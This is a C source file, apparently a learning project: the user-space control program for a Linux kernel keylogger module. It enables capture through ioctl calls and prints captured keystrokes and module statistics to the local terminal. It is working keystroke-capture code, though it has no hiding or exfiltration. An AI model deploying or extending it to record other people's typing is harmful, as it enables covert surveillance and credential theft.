/*
This file is the remote control for the TV; we can't turn on the working TV without a remote.
keylogger.c (driver/) is the kernel module but we need this user-space program to make it work (see Makefile).
*/

#include <stdio.h>      
#include <stdlib.h>     
#include <unistd.h>    
#include <pthread.h>    
#include <fcntl.h>     
#include <string.h>    
#include <errno.h>     
#include <sys/ioctl.h> 

#define DEV_PATH  "/dev/keylogger"        
#define PROC_PATH "/proc/keylogger_stats" 

// IOCTL codes, must match the ones defined in the kernel module
#define KEYLOGGER_IOC_MAGIC       'k'
#define KEYLOGGER_IOC_RESET_STATS _IO(KEYLOGGER_IOC_MAGIC, 0)
#define KEYLOGGER_IOC_CLEAR_BUFFER _IO(KEYLOGGER_IOC_MAGIC, 1)
#define KEYLOGGER_IOC_ENABLE      _IO(KEYLOGGER_IOC_MAGIC, 2)
#define KEYLOGGER_IOC_DISABLE     _IO(KEYLOGGER_IOC_MAGIC, 3)

/*
reader_thread:
    This thread opens /dev/keylogger and continuously reads characters from it.
 */
void *reader_thread(void *arg)
{
    int fd = open(DEV_PATH, O_RDONLY);  // Open the keylogger device for reading only
    char buf[64];                       // Temporary buffer for data from the device
    ssize_t n;                          // Number of bytes read

    if (fd < 0) 
    {
        perror("open /dev/keylogger");  // Print error if open failed
        return NULL;
    }

    printf("[reader] Started. Waiting for keys...\n");

    while (1) 
    {
        n = read(fd, buf, sizeof(buf)); // Try to read up to sizeof(buf) bytes
        if (n < 0) 
        {
            perror("read"); // On error, print message and stop the loop
            break;
        } 
        
        else if (n == 0) 
        {
            // n == 0 means "end of file" (no more data, device closed)
            break;
        } 
        
        else 
        {
            // We got n bytes; print them directly to the terminal
            fwrite(buf, 1, n, stdout);
            fflush(stdout); // Make sure it appears immediately
        }
    }

    close(fd); // Close the device file before exiting
    return NULL;
}

/*
 * stats_thread:
 * This thread periodically opens /proc/keylogger_stats, reads the stats,
 * and prints them every 2 seconds.
 */
void *stats_thread(void *arg)
{
    char buf[256]; // Buffer to hold the stats text

    while (1) 
    {
        int fd = open(PROC_PATH, O_RDONLY);  // Open the /proc stats file
        if (fd < 0) 
        {
            perror("open /proc/keylogger_stats");
            sleep(2); // Wait a bit and try again
            continue;
        }

        ssize_t n = read(fd, buf, sizeof(buf) - 1); // Read up to buffer size - 1
        close(fd); // Close /proc file

        if (n > 0) 
        {
            buf[n] = '\0'; // Null-terminate to make it a string
            printf("\n[stats]\n%s\n", buf); // Print the stats block
        }

        sleep(2); // Wait 2 seconds before reading again
    }

    return NULL;
}

/*
main:
Opens /dev/keylogger once to send IOCTL control commands:
    ENABLE, RESET_STATS, CLEAR_BUFFER.

Starts two threads:
    reader_thread: prints captured keys.
    stats_thread: prints statistics every 2 seconds.
 */
int main(void)
{
    pthread_t t1, t2; // Thread handles for reader and stats threads
    int fd;

    fd = open(DEV_PATH, O_RDWR); // Open device for read/write
    if (fd < 0) 
    {
        perror("open /dev/keylogger");
        return 1;
    }

    // Enable logging and clear stats at startup using IOCTL commands
    if (ioctl(fd, KEYLOGGER_IOC_ENABLE) < 0) perror("ioctl ENABLE");

    if (ioctl(fd, KEYLOGGER_IOC_RESET_STATS) < 0) perror("ioctl RESET_STATS");

    if (ioctl(fd, KEYLOGGER_IOC_CLEAR_BUFFER) < 0) perror("ioctl CLEAR_BUFFER");

    close(fd); 

    // Start the reader thread
    if (pthread_create(&t1, NULL, reader_thread, NULL) != 0) 
    {
        perror("pthread_create reader");
        return 1;
    }

    // Start the stats thread
    if (pthread_create(&t2, NULL, stats_thread, NULL) != 0) {
        perror("pthread_create stats");
        return 1;
    }

    // Wait for both threads to finish (in practice they run forever)
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    return 0;
}
